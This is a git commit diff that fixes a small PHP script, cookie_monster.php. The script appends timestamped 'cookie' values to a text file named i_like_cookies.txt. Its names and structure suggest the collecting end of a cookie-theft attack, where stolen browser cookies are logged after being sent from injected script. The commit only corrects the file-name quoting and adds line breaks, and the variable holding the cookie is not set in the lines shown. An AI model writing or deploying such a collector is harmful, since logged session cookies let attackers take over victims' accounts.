0aea9614e05b94316380a29089a3c5a84d1232a1
Nick Antoniou <nikolasea@windowslive.com>
2019-05-02 19:53:33 +0300

    Fix cookie monster vol2

--- cookie_monster.php
+++ cookie_monster.php
@@ -1,4 +1,4 @@
 <?php
 date_default_timezone_set("Europe/Athens");
-file_put_contents(i_like_cookies.txt, date('Y-m-d H:i:s').", cookie: ".$content, FILE_APPEND);
+file_put_contents("i_like_cookies.txt", date('Y-m-d H:i:s').", cookie: ".$content. PHP_EOL, FILE_APPEND);
 ?>
